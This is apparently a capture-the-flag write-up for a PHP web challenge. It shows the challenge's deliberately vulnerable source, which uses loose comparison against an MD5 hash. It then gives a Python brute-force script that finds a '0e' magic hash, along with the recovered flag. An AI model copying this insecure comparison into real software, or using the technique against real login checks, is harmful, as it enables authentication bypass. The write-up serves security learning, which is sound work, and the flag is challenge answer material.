#  Knight - Find Pass Code - 2

Viewing the source-code, we found a comment: 
```
Hi Serafin, I think you already know how you can view the source code :P 
```

**Credentials found**: Serafin
Nothing important about Serafin, just reference to version 1, let's view the source-code by addming `source` parameter to GET requests just like version 1: `https://find-pass-code-two.kshackzone.com/?source`
```php
<?php
require "flag.php";
$old_pass_codes = array("0e215962017", "0e730083352", "0e807097110", "0e840922711");
$old_pass_flag = false;
if (isset($_POST["pass_code"]) && !is_array($_POST["pass_code"])) {
    foreach ($old_pass_codes as $old_pass_code) {
        if ($_POST["pass_code"] === $old_pass_code) {
            $old_pass_flag = true;
            break;
        }
    }
    if ($old_pass_flag) {
        echo "Sorry ! It's an old pass code.";
    } else if ($_POST["pass_code"] == md5($_POST["pass_code"])) {
        echo "KCTF Flag : {$flag}";
    } else {
        echo "Oh....My....God. You entered the wrong pass code.<br>";
    }
}
if (isset($_GET["source"])) {
    print show_source(__FILE__);
}

?>
```
Basiclly this is PHP loose comparion + MD5 hash to 0e123(equal to 0), if you're not already know, go research!

**Magic hash**: `https://github.com/spaze/hashes/blob/master/md5.md`
	
	0e215962017:0e291242476940776845150308577824 --> is an old passcode

Ok, now i know running with print is extreamly slow, python range(1000000) with calculation without print only take like 5s and with print is take like *a long time!*
Based on the last old_pass_code, we start brute-forcing at: `807097111`
```python
import hashlib

print('Running.......!')
for i in range(807097111, 1500000000):
	md5 = hashlib.md5(f'0e{i}'.encode()).hexdigest()
	if md5[:2] == '0e' and md5[2:].isnumeric():
		print(f'[FOUND] - 0e{i} : ' + md5)
		break

```
**[FOUND]**: `0e1137126905 : 0e291659922323405260514745084877`

**flag**: `KCTF{ShOuD_wE_cOmPaRe_MD5_LiKe_ThAt__Be_SmArT}`
